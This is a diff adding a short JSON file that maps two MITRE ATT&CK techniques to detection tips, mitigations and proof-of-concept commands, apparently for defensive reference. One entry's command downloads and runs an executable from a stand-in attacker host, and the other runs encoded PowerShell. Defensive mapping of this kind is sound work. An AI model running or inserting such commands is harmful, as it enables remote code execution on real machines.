@@ -1,0 +1,12 @@
+{
+  "T1059": {
+    "detection": "Monitor PowerShell process creation with suspicious commands.",
+    "mitigation": "Enforce Script Block Logging and constrained language mode.",
+    "poc_command": "powershell.exe -EncodedCommand <base64-script>"
+  },
+  "T1203": {
+    "detection": "Watch for abnormal exploit tool usage against client apps.",
+    "mitigation": "Apply up‑to‑date patches and disable vulnerable features.",
+    "poc_command": "curl http://attacker/exploit.exe -o exploit.exe && exploit.exe"
+  }
+}
